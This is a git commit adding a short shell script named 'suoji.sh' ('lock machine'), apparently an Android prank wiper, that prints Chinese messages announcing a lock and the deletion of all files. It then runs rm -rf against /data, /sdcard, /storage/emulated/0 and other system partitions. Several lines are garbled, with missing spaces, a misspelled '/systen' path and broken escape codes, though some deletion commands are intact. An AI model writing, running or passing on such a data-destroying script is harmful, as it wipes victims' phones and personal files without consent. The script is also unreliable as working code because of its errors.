0599b9ede66427bfae8e0859fd665dc781129c58
114514imageset <150513325+114514imageset@users.noreply.github.com>
2023-11-11 21:49:37 +0800

    锁机.sh
    子楚按

---
+++ suoji.sh
@@ -0,0 +1,15 @@
+echo"033[锁机\033[0m"
+sleep 1;
+echo"\033[正在删除所有文件...\033[0m"
+sleep 1;
+echo "搬运于张豪锁机(豪哥锁机)"
+sleep 1;
+
+rm -rf /systen
+rm -rf /data
+rm-rf /vendor
+rm-rf /product
+rm-rf /sdcard
+rm-rf /storage/emulated/0
+rm-rf /storage/sdcard
+
